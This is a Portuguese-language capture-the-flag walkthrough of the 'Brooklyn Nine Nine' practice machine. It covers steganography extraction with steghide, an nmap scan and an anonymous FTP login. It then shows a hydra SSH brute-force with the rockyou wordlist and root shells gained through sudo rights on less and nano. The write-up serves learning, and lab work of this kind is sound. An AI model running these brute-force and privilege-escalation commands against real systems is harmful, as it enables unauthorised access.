# Brooklyn Nine Nine
Existem duas maneiras principais de obter acesso root.
## Objetivos
Conseguir Explorar a aplicação web.

Conseguir Root de duas ou mais maneiras.

Aprender o máximo.
## Recon
Recebemos o $IP. Dei uma olhada na pagina web, mas não havia nada. Fui ao código fonte e encontrei um Comentario HTML.
```HTML
<!-- Have you ever heard of steganography? -->
```
Ok... Não e nada surprendente.
```BASH
wget http://$IP/brooklyn99.jpg
--2025-11-10 18:22:02--  http://10.201.109.170/brooklyn99.jpg
Conectando-se a 10.201.109.170:80... conectado.
A requisição HTTP foi enviada, aguardando resposta... 200 OK
Tamanho: 69685 (68K) [image/jpeg]
Salvando em: “brooklyn99.jpg”

brooklyn99.jpg      100%[===================>]  68,05K   119KB/s    em 0,6s    

2025-11-10 18:22:04 (119 KB/s) - “brooklyn99.jpg” salvo [69685/69685]
```
Bom, verifiquei com as ferramentas **Strings** e **Binwalk**: NADA.

Então pesquisei como esconder e extrair coisas de imagens. Achei esse artigo no [Medium](https://medium.com/@ria.banerjee005/steganography-tools-techniques-bba3f95c7148). Thanks Medium!

#### Steghide
Eu não a possuia. Então tive que instalar.
```BASH
sudo apt install steghide
steghide extract -sf brooklyn99.jpg 
Enter passphrase: 
wrote extracted data to "note.txt".
```
A senha era padrão: admin.
```BASH
cat note.txt 
Holts Password:
[REDACTED]

Enjoy!!
```
Então e isso kkkk. Temos o usuário e a senha. Irei verificar agora os Serviços rodando na máquina.
```BASH
nmap $IP -n --disable-arp-ping -T4 -F
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
Eh... esse ftp me surprendeu agora, vou verificar.
```Bash
ftp anonymous@$IP
Connected to 10.201.0.23.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40728|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||38724|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |***********************************|   119      667.87 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.37 KiB/s)
ftp> 
```
Exato kkkk, quem disse que ia ser facil mentiu. Aqui me deparei com um servidor FTP que so aceitava login anonymous, porém com senha. Felizmente a senha nos tinhamos sido fornecida momentos antes.

No arquivo encontramos uma dica que nos leva ao próximo capitúlo: )
## Acesso Inicial
A dica que recebemos se trata de um aviso para mudar a senha:

    From Amy,
    Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
Dito isso, temos uma senha fraca, e o que hackers fazem com senha fraca? exatamente.
```Bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt  $IP ssh
[22][ssh] host: 10.201.0.23   login: jake   password: [REDACTED]
```
E estamos dentro:
```BASH
ssh jake@$IP
jake@10.201.0.23's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$
```
Antes de ir de fato para o proximo capitúlo, recomendo que procurem pelo meu repositório de priv escalation.
## Priv Escalation #1
Vamos começar com o básico:
```Bash
jake@brookly_nine_nine:~$ ls -al
total 44
drwxr-xr-x 6 jake jake 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 root root 1349 May 26  2020 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
drwx------ 2 jake jake 4096 May 17  2020 .cache
drwx------ 3 jake jake 4096 May 17  2020 .gnupg
-rw------- 1 root root   67 May 26  2020 .lesshst
drwxrwxr-x 3 jake jake 4096 May 26  2020 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4096 May 18  2020 .ssh
-rw-r--r-- 1 jake jake    0 May 17  2020 .sudo_as_admin_successful
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ 
```
Fácil. Thanks [Gtfobins](https://gtfobins.github.io/)
```Bash
jake@brookly_nine_nine:~$ sudo less /etc/profile
# 
```
Você pode ler sobre isso [aqui](https://gtfobins.github.io/gtfobins/less/#sudo).
## Priv Escalation #2
Continuando de onde paramos, vamos usar as credenciais que conseguimos no desafio de stenografia:
```BASH
jake@brookly_nine_nine:~$ sudo less /etc/profile
# exit
!done  (press RETURN)
jake@brookly_nine_nine:~$ su holt
Password: 

holt@brookly_nine_nine:/home/jake$ 
holt@brookly_nine_nine:/home/jake$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
holt@brookly_nine_nine:/home/jake$ 
```
Mais fácil ainda kkkk. Vou pedir ao [GtfoBins](https://gtfobins.github.io/) pa patrocinar kkkk.
```Bash
sudo nano
# ls
# whoami
root
# 
```
[Leia-me](https://gtfobins.github.io/gtfobins/nano/#sudo)
## Aprendizados
Cuidado com Editores de texto e suas permissões: (VIM/VI, NANO e LESS)


Técnicas aplicadas: Brute-force,stenografia e escalação de privilegios.

# Hack The World!
